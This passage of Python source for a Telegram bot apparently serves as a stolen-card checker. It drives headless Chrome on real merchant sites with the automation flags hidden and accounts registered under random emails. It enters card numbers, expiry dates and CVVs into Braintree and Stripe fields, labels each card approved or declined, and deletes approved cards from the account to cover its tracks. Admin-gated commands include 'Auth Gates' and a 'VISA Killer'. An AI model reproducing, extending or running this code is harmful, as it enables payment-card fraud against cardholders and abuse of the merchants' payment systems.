            wait.until(EC.element_to_be_clickable((By.ID, "select2-billing_country-container"))).click()
            wait.until(EC.presence_of_element_located((By.CLASS_NAME, "select2-search__field"))).send_keys("United States" + u'\ue007')
            driver.find_element(By.ID, "select2-billing_state-container").click()
            wait.until(EC.presence_of_element_located((By.CLASS_NAME, "select2-search__field"))).send_keys("Alabama" + u'\ue007')

            driver.find_element(By.ID, "billing_first_name").send_keys("Lucas")
            driver.find_element(By.ID, "billing_last_name").send_keys("Miller")
            driver.find_element(By.ID, "billing_address_1").send_keys("123 Main St")
            driver.find_element(By.ID, "billing_city").send_keys("Austin")
            driver.find_element(By.ID, "billing_postcode").send_keys("98101")
            driver.find_element(By.ID, "billing_phone").send_keys("20255501" + ''.join(random.choices(string.digits, k=2)))

            try:
                cookie_banner = driver.find_element(By.CLASS_NAME, "cmplz-cookiebanner")
                if cookie_banner.is_displayed():
                    driver.execute_script("arguments[0].style.display='none';", cookie_banner)
                    time.sleep(0.5)
            except:
                pass

            wait.until(EC.element_to_be_clickable((By.NAME, "save_address"))).click()
            wait.until(EC.presence_of_element_located((By.TAG_NAME, "body")))

            # 2. Go to add-payment-method
            driver.get("https://truedark.com/my-account/add-payment-method/")
            time.sleep(1.5)

            parts = extract_card_parts(card_str)
            if not parts:
                raise Exception("Invalid card format.")
            card, mm, yy, cvv = parts
            exp = f"{mm} / {yy}"
            bin_info = get_bin_info(card[:6])

            # Braintree iframe: card
            wait.until(EC.presence_of_element_located((By.CSS_SELECTOR, "iframe[name*='braintree-hosted-field-number']")))
            iframe_number = driver.find_element(By.CSS_SELECTOR, "iframe[name*='braintree-hosted-field-number']")
            driver.switch_to.frame(iframe_number)
            wait.until(EC.presence_of_element_located((By.ID, "credit-card-number"))).send_keys(card)
            driver.switch_to.default_content()

            # Braintree iframe: expiry
            iframe_exp = driver.find_element(By.CSS_SELECTOR, "iframe[name*='braintree-hosted-field-expirationDate']")
            driver.switch_to.frame(iframe_exp)
            wait.until(EC.presence_of_element_located((By.ID, "expiration"))).send_keys(exp)
            driver.switch_to.default_content()

            # Braintree iframe: cvv
            iframe_cvv = driver.find_element(By.CSS_SELECTOR, "iframe[name*='braintree-hosted-field-cvv']")
            driver.switch_to.frame(iframe_cvv)
            wait.until(EC.presence_of_element_located((By.ID, "cvv"))).send_keys(cvv)
            driver.switch_to.default_content()

            place_btn = wait.until(EC.element_to_be_clickable((By.ID, "place_order")))
            driver.execute_script("arguments[0].scrollIntoView(true);", place_btn)
            try:
                place_btn.click()
            except:
                driver.execute_script("arguments[0].click();", place_btn)

            # Auto-adjust wait for payment result (instead of fixed 2s)
            result_el = wait.until(EC.visibility_of_element_located((By.CSS_SELECTOR,
                "div.woocommerce-error, div.woocommerce-message, div.message-container.alert-color, div.message-container.success-color")))
            result_text = result_el.text.strip()
            status = "✅ Approved" if "new payment method added" in result_text.lower() else "❌ Declined"
            full_card = f"{card}|{mm}|20{yy}|{cvv}"
            took = round(time.time() - start, 2)

            msg = (
                f"💳 Card: `{full_card}`\n"
                f"🏦 BIN: `{bin_info}`\n"
                f"📟 Status: {status}\n"
                f"📩 Response: `{result_text}`\n"
                f"🔁 Attempt: {attempt}/3\n"
                f"🌐 Gateway: Braintree Auth-1\n"
                f"⏱ Took: {took}s"
            )
            await bot.edit_message_text(chat_id=chat_id, message_id=message_id, text=msg, parse_mode="Markdown")

            if "new payment method added" in result_text.lower():
                try:
                    delete_btn = driver.find_element(By.CSS_SELECTOR, "a.button.delete[href*='delete-payment-method']")
                    delete_btn.click()
                    time.sleep(1)
                    try:
                        WebDriverWait(driver, 3).until(EC.alert_is_present())
                        driver.switch_to.alert.accept()
                    except:
                        pass
                    msg += "\n\n🗑️ Card was auto-deleted after approval."
                    await bot.edit_message_text(chat_id=chat_id, message_id=message_id, text=msg, parse_mode="Markdown")
                except Exception as e:
                    msg += f"\n\n⚠️ Card approved, but delete failed: {e}"
                    await bot.edit_message_text(chat_id=chat_id, message_id=message_id, text=msg, parse_mode="Markdown")

            driver.quit()
            shutil.rmtree(temp_profile_dir, ignore_errors=True)
            return

        except Exception:
            if attempt == 3:
                trace = traceback.format_exc()
                await fail_user()
                await fail_admin(trace)
            try:
                driver.quit()
                shutil.rmtree(temp_profile_dir, ignore_errors=True)
            except:
                pass

async def bt_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    if not is_approved(uid, "bt"):
        await update.message.reply_text("⛔ You are not approved to use this command.")
        return

    raw_input = " ".join(context.args).strip() if context.args else ""
    if not raw_input and update.message.reply_to_message:
        raw_input = update.message.reply_to_message.text.strip()

    lines = raw_input.split("\n") if "\n" in raw_input else [raw_input]
    cards = [line.strip() for line in lines if re.search(r'\d{12,19}.*\d{1,2}.*\d{2,4}.*\d{3,4}', line)]

    if not cards:
        await update.message.reply_text("❌ No valid card(s) found.\nUse: `/bt 4111111111111111|08|2026|123`", parse_mode="Markdown")
        return

    if len(cards) > 6:
        await update.message.reply_text("⚠️ You can send a maximum of 6 cards at once.")
        return

    for card_str in cards:
        msg = await update.message.reply_text(f"💳 `{card_str}`", parse_mode="Markdown")
        Process(target=run_bt_check, args=(card_str, update.effective_chat.id, msg.message_id), daemon=True).start()





# ==== 7.2 /au Command (Stripe Auth V2, single) ====

def run_au_process(card_input, update_dict):
    asyncio.run(au_main(card_input, update_dict))

async def au_main(card_input, update_dict):
    import tempfile
    import shutil

    uid = update_dict["user_id"]
    chat_id = update_dict["chat_id"]
    msg_id = update_dict["message_id"]
    username = update_dict.get("username", "User")
    bot = Bot(BOT_TOKEN)
    start_time = time.time()

    parsed = parse_card_input(card_input)
    if not parsed:
        await bot.edit_message_text(
            chat_id=chat_id, message_id=msg_id,
            text="❌ Invalid format.\nUse: `/au 4111111111111111|08|26|123`",
            parse_mode="Markdown"
        )
        return

    card, mm, yy, cvv = parsed
    expiry = f"{mm}/{yy}"
    full_card = f"{card}|{mm}|20{yy}|{cvv}"
    bin_info = get_bin_info(card[:6])
    temp_profile_dir = tempfile.mkdtemp()

    try:
        ua = UserAgent().random if UserAgent else "Mozilla/5.0 Chrome/118"
        options = webdriver.ChromeOptions()
        options.binary_location = CHROME_PATH
        options.add_argument(f"--user-data-dir={temp_profile_dir}")
        options.add_argument(f"user-agent={ua}")
        options.add_argument("--disable-blink-features=AutomationControlled")
        options.add_argument("--headless=new")
        options.add_argument("--no-sandbox")
        options.add_argument("--disable-dev-shm-usage")
        options.add_argument("--window-size=1920,1080")
        options.add_experimental_option("excludeSwitches", ["enable-automation"])
        options.add_experimental_option('useAutomationExtension', False)

        service = Service(executable_path=CHROME_DRIVER_PATH)
        driver = webdriver.Chrome(service=service, options=options)
        wait = WebDriverWait(driver, 20)

        # STEP 1: Register with random email (real-looking domain)
        email = random_email()
        driver.get("https://potatoprincesses.com/my-account/add-payment-method/")

        try:
            wait.until(EC.element_to_be_clickable((By.ID, "reg_email"))).send_keys(email)
            driver.find_element(By.NAME, "register").click()
        except Exception as e:
            raise Exception(f"Account register step failed: {e}")

              # STEP 2: Wait for Stripe iframe to appear (robust wait)
        # Sometimes page scroll needed for Stripe fields to load
        driver.execute_script("window.scrollBy(0, 200);")
        deadline = time.time() + 20  # was 12, now 20 seconds
        stripe_iframes = []

        while time.time() < deadline:
            stripe_iframes = driver.find_elements(By.CSS_SELECTOR, "iframe[name^='__privateStripeFrame'],iframe[src*='stripe']")
            if stripe_iframes:
                break
            # Try an extra scroll halfway through
            if deadline - time.time() < 12:
                driver.execute_script("window.scrollBy(0, 150);")
            time.sleep(0.4)

        # Optionally: try a page refresh if still missing (last resort)
        if not stripe_iframes:
            driver.refresh()
            time.sleep(2)
            driver.execute_script("window.scrollBy(0, 250);")
            stripe_iframes = driver.find_elements(By.CSS_SELECTOR, "iframe[name^='__privateStripeFrame'],iframe[src*='stripe']")
        if not stripe_iframes:
            raise Exception("❌ Stripe payment fields did not load.")


        # STEP 3: Fill card, expiry, cvv in Stripe iframes
        card_filled = expiry_filled = cvv_filled = False
        for iframe in stripe_iframes:
            driver.switch_to.default_content()
            driver.switch_to.frame(iframe)
            # Card number
            try:
                c = driver.find_elements(By.ID, "Field-numberInput")
                if c:
                    c[0].send_keys(card)
                    card_filled = True
            except: pass
            # Expiry
            try:
                e = driver.find_elements(By.ID, "Field-expiryInput")
                if e:
                    e[0].send_keys(expiry)
                    expiry_filled = True
            except: pass
            # CVV
            try:
                v = driver.find_elements(By.ID, "Field-cvcInput")
                if v:
                    v[0].send_keys(cvv)
                    cvv_filled = True
            except: pass
        driver.switch_to.default_content()
        if not (card_filled and expiry_filled and cvv_filled):
            raise Exception("❌ Failed to fill all card fields.")

        # STEP 4: Scroll a bit and click Add Payment Method
        try:
            driver.execute_script("window.scrollBy(0, 250);")
            place_btn = wait.until(EC.element_to_be_clickable((By.ID, "place_order")))
            place_btn.click()
        except Exception as e:
            raise Exception(f"Clicking Add payment method failed: {e}")

        # STEP 5: Wait and parse for result message (auto-adjust wait)
        status = "Declined"
        response_text = None
        for _ in range(18):
            try:
                success = driver.find_element(By.CSS_SELECTOR, "div.woocommerce-message")
                if "successfully added" in success.text.lower() or "added" in success.text.lower():
                    status = "Approved"
                    response_text = success.text.strip()
                    break
            except: pass
            try:
                error = driver.find_element(By.CSS_SELECTOR, "ul.woocommerce-error li")
                response_text = error.text.strip()
                break
            except: pass
            time.sleep(0.4)
        if not response_text:
            response_text = "Unknown"

        took = f"{time.time() - start_time:.2f}s"
        emoji = "✅" if status == "Approved" else "❌"
        result_msg = (
            f"💳 **Card:** `{full_card}`\n"
            f"🏦 **BIN:** `{bin_info}`\n"
            f"📟 **Status:** {emoji} **{status}**\n"
            f"📩 **Response:** `{response_text}`\n"
            f"🌐 **Gateway:** **Stripe-Auth-V2**\n"
            f"⏱ **Took:** **{took}**\n"
            f"🧑‍💻 **Checked by:** **{username}** [`{uid}`]"
        )
        await bot.edit_message_text(chat_id=chat_id, message_id=msg_id, text=result_msg, parse_mode="Markdown")

    except Exception as exc:
        screenshot = "au_fail.png"
        try:
            driver.save_screenshot(screenshot)
        except: pass
        await bot.edit_message_text(chat_id=chat_id, message_id=msg_id,
            text="❌ Stripe Auth V2 process failed.", parse_mode="Markdown")
        # Only send the first 950 chars of trace (so Telegram doesn't reject it)
        trace = traceback.format_exc()
        trace_caption = f"```\n{trace[:950]}\n```"
        try:
            await bot.send_photo(chat_id=BOT_ADMIN_ID,
                photo=open(screenshot, "rb") if os.path.exists(screenshot) else None,
                caption=trace_caption,
                parse_mode="Markdown")
        except:
            await bot.send_message(chat_id=BOT_ADMIN_ID,
                text=f"Stripe Auth V2 failed for user {uid}.\n{trace_caption}",
                parse_mode="Markdown")
        if os.path.exists(screenshot):
            os.remove(screenshot)
    finally:
        try:
            driver.quit()
            shutil.rmtree(temp_profile_dir, ignore_errors=True)
        except: pass

async def au_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    uname = update.effective_user.first_name or "User"

    if not is_approved(uid, "au"):
        await update.message.reply_text("⛔ You are not approved to use this command.")
        return

    raw_input = " ".join(context.args).strip() if context.args else ""
    if not raw_input and update.message.reply_to_message:
        raw_input = (update.message.reply_to_message.text or "").strip()

    card_input = extract_card_input(raw_input)
    if not card_input:
        await update.message.reply_text("❌ No valid card found.\nUse: `/au 4111111111111111|08|26|123`", parse_mode="Markdown")
        return

    msg = await update.message.reply_text(f"💳 `{card_input}`", parse_mode="Markdown")
    update_dict = {
        "user_id": uid,
        "chat_id": update.effective_chat.id,
        "message_id": msg.message_id,
        "username": uname,
    }
    Process(target=run_au_process, args=(card_input, update_dict), daemon=True).start()




# ==== 8. /cmds (grouped, per-command locks) ====
async def cmds_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    isadm = is_admin(uid)

    def lock(line: str, cmd_key: str | None) -> str:
        if cmd_key is None:
            return line  # public tool
        return f"{line} {'🔒' if not is_approved(uid, cmd_key) else ''}"

    parts = []

    # Auth Gates
    parts.append("🔐 *Auth Gates*\n" + "\n".join([
        lock("/st <card> — Stripe Auth V1", "st"),
        lock("/au <card> — Stripe Auth V2 (single)", "au"),
        lock("/bt <card> — Braintree Auth-1", "bt"),
    ]))

    # Visa Killer Gates
    parts.append("🗡️ *Visa Killer Gates*\n" + "\n".join([
        lock("/kill <card> — VISA Killer", "kill"),
    ]))

    # Tools (note: /bin remains gated in your current logic)
    parts.append("🧰 *Tools*\n" + "\n".join([
        "/start — Welcome message",
        "/help — How to use the bot",
        "/cmds — Show command list",
        "/id — Show your Telegram ID",
        "/status — Show bot status",
        lock("/bin <bins/cards/mixed> — BIN lookup", "bin"),
    ]))

    if isadm:
        parts.append("🛠️ *Admin cmds*\n" + "\n".join([
            "/approve <id> <cmd|all> — Approve access",
            "/unapprove <id> <cmd|all> — Revoke access",
            "/remove <id> — Remove user (all approvals)",
            "/ban <id> — Ban user",
            "/unban <id> — Unban user",
            f"\n✅ Approved (global): {len(approved_all)}",
        ]))

    # Footer note for locked cmds
    if not is_approved(uid, "st") or not is_approved(uid, "bt") or not is_approved(uid, "kill") or not is_approved(uid, "bin"):
        parts.append("🔒 _Locked items require admin approval._")

    text = "📋 *Command List*\n\n" + "\n\n".join(parts)
    await update.message.reply_text(text, parse_mode="Markdown")




# ==== 8.1 Admin Commands (per-command approve) ====
def _normalize_cmd_arg(arg: str) -> str | None:
    a = (arg or "").lower().strip()
    if a in ("all", *CMD_KEYS):
        return a
    return None

async def approve(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_admin(update.effective_user.id):
        return
    if len(context.args) < 2:
        await update.message.reply_text("⚠️ Usage: /approve <user_id> <cmd|all>\nExample: `/approve 123456 st`", parse_mode="Markdown")
        return
    try:
        uid = int(context.args[0])
    except:
        await update.message.reply_text("❌ Invalid user ID.")
        return

    cmd = _normalize_cmd_arg(context.args[1])
    if cmd is None:
        await update.message.reply_text(f"❌ Unknown command type. Use one of: {', '.join(CMD_KEYS)} or `all`", parse_mode="Markdown")
        return

    if cmd == "all":
        approved_all.add(uid)
        # keep legacy set in sync
        approved_users.add(uid)
    else:
        approved_cmds[cmd].add(uid)

    banned_users.discard(uid)
    save_users()
    await update.message.reply_text(f"✅ Approved `{uid}` for `{cmd}`", parse_mode="Markdown")

async def unapprove(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_admin(update.effective_user.id):
        return
    if len(context.args) < 2:
        await update.message.reply_text("⚠️ Usage: /unapprove <user_id> <cmd|all>", parse_mode="Markdown")
        return
    try:
        uid = int(context.args[0])
    except:
        await update.message.reply_text("❌ Invalid user ID.")
        return

    cmd = _normalize_cmd_arg(context.args[1])
    if cmd is None:
        await update.message.reply_text(f"❌ Unknown command type. Use one of: {', '.join(CMD_KEYS)} or `all`", parse_mode="Markdown")
        return

    if cmd == "all":
        approved_all.discard(uid)
        approved_users.discard(uid)  # legacy sync
        # also strip from every per-cmd set to be strict
        for k in CMD_KEYS:
            approved_cmds[k].discard(uid)
    else:
        approved_cmds[cmd].discard(uid)

    save_users()
    await update.message.reply_text(f"🗑️ Revoked `{cmd}` from `{uid}`", parse_mode="Markdown")

async def remove(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_admin(update.effective_user.id):
        return
    if not context.args:
        await update.message.reply_text("⚠️ Usage: /remove <user_id>")
        return
    try:
        uid = int(context.args[0])
    except:
        await update.message.reply_text("❌ Invalid user ID.")
        return

    # Remove the user from all approvals and bans
    approved_all.discard(uid)
    approved_users.discard(uid)  # legacy sync
    for k in CMD_KEYS:
        approved_cmds[k].discard(uid)
    banned_users.discard(uid)
    save_users()
    await update.message.reply_text(f"🗑️ Removed user `{uid}` from all lists", parse_mode="Markdown")

async def ban(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_admin(update.effective_user.id):
        return
    if not context.args:
        await update.message.reply_text("⚠️ Usage: /ban <user_id>")
        return
    try:
        uid = int(context.args[0])
    except:
        await update.message.reply_text("❌ Invalid user ID.")
        return

    banned_users.add(uid)
    # banning implies removing all approvals
    approved_all.discard(uid)
    approved_users.discard(uid)
    for k in CMD_KEYS:
        approved_cmds[k].discard(uid)
    save_users()
    await update.message.reply_text(f"🚫 Banned user `{uid}`", parse_mode="Markdown")

async def unban(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_admin(update.effective_user.id):
        return
    if not context.args:
        await update.message.reply_text("⚠️ Usage: /unban <user_id>")
        return
    try:
        uid = int(context.args[0])
    except:
        await update.message.reply_text("❌ Invalid user ID.")
        return

    banned_users.discard(uid)
    save_users()
    await update.message.reply_text(f"✅ Unbanned user `{uid}`", parse_mode="Markdown")


# ==== 9. Dispatcher Entry Point ====
async def main():
    token = os.environ.get("BOT_TOKEN")
    app = ApplicationBuilder().token(token).build()

    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("help", help_cmd))
    app.add_handler(CommandHandler("cmds", cmds_cmd))
    app.add_handler(CommandHandler("id", id_cmd))
    app.add_handler(CommandHandler("bin", bin_cmd))  # BIN Lookup
    app.add_handler(CommandHandler("status", status_cmd))
    app.add_handler(CommandHandler("unapprove", unapprove))  # NEW
    app.add_handler(CommandHandler("approve", approve))
    app.add_handler(CommandHandler("remove", remove))
    app.add_handler(CommandHandler("ban", ban))
    app.add_handler(CommandHandler("unban", unban))
    app.add_handler(CommandHandler("kill", kill_cmd))  # VISA KILLER
    app.add_handler(CommandHandler("st", st_cmd))      # STRIPE AUTH V1
    app.add_handler(CommandHandler("au", au_cmd))      # STRIPE AUTH V2 (single)
    app.add_handler(CommandHandler("bt", bt_cmd))      # BRAINTREE AUTH V1


    print("🤖 Bot is running...")
    await app.run_polling()


if __name__ == "__main__":
    asyncio.run(main())
